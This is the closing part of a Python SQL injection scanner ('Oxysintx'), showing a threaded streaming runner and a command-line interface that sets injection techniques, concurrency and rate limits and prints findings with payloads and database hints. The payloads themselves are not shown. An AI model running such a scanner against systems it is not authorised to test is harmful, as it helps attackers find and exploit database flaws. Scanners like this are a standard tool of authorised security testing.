    threading.Thread(target=_worker, daemon=True,
                     name=f"sql-injection-{url[:32]}").start()

    yield {
        "type":    "start",
        "url":     url,
        "options": {
            "techniques": o["techniques"],
            "max_params": o["max_params"],
            "rate_limit": o["rate_limit"],
        },
    }

    while not done.is_set():
        with events_lock:
            pending, events[:] = list(events), []
        for ev in pending:
            yield ev
        done.wait(timeout=0.4)

    with events_lock:
        for ev in events:
            yield ev

    if "error" in holder:
        yield {"type": "error", "message": holder["error"]}
    else:
        yield {"type": "result", "data": holder.get("result", {})}


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
def _cli() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    p = argparse.ArgumentParser(
        description="SQL Injection Scanner — Oxysintx",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("url", nargs="?", help="Target URL with query params")
    p.add_argument("--method", default="GET", choices=["GET", "POST"])
    p.add_argument("--techniques", default="error,boolean,time",
                   help="comma-separated: error,boolean,time,union")
    p.add_argument("--max-params",   type=int,   default=DEFAULT_MAX_PARAMS)
    p.add_argument("--concurrency",  type=int,   default=DEFAULT_CONCURRENCY)
    p.add_argument("--rate-limit",   type=float, default=DEFAULT_RATE_LIMIT)
    p.add_argument("--timeout",      type=float, default=DEFAULT_TIMEOUT)
    p.add_argument("--max-duration", type=float, default=DEFAULT_MAX_DURATION)
    p.add_argument("--json",   action="store_true")
    p.add_argument("--stream", action="store_true")
    p.add_argument("--wordlists", action="store_true",
                   help="print wordlist metadata and exit")
    p.add_argument("--version", action="version", version=__version__)
    args = p.parse_args()

    if args.wordlists:
        print(json.dumps(ensure_wordlists(), indent=2))
        return 0

    if not args.url:
        p.error("url required")

    techniques = [t.strip() for t in args.techniques.split(",") if t.strip()]
    options = {
        "techniques":   techniques,
        "max_params":   args.max_params,
        "concurrency":  args.concurrency,
        "rate_limit":   args.rate_limit,
        "timeout":      args.timeout,
        "max_duration": args.max_duration,
        "method":       args.method,
    }

    if args.stream:
        for ev in run_streaming(args.url, options):
            t = ev.get("type")
            if t == "start":
                print(f"[start] {ev['url']}  techniques={ev['options']['techniques']}")
            elif t == "progress":
                print(f"[{ev['percent']:3d}%] {ev['done']}/{ev['total']}  {ev['label']}")
            elif t == "result":
                if args.json: print(json.dumps(ev["data"], indent=2))
            elif t == "error":
                print(f"[ERROR] {ev['message']}", file=sys.stderr)
        return 0

    report = run_sql_injection(args.url, method=args.method, techniques=techniques)
    if args.json:
        print(json.dumps(report, indent=2))
        return 0 if report.get("vulnerable") else 1

    print()
    print("═" * 72)
    print(f"  SQL Injection Report — {report['url']}")
    print("═" * 72)
    print(f"  Vulnerable        : {'YES' if report['vulnerable'] else 'no'}")
    print(f"  Techniques        : {', '.join(report['techniques_tested'])}")
    print(f"  Parameters        : {len(report['parameters_tested'])}")
    print(f"  Requests sent     : {report['requests_sent']}")
    print(f"  Elapsed           : {report['elapsed']}s")
    if report.get("waf_detected"):
        print(f"  WAF               : {report['waf_detected']}")
    print()
    for f in report["findings"]:
        print(f"  [{f['status'].upper():10s}] [{f['technique']:14s}] "
              f"param={f['parameter']:16s} conf={f['confidence']}")
        print(f"              payload: {f['payload'][:80]}")
        if f.get("db_hint"):
            print(f"              db     : {f['db_hint']}")
        print()
    return 0 if report.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(_cli())
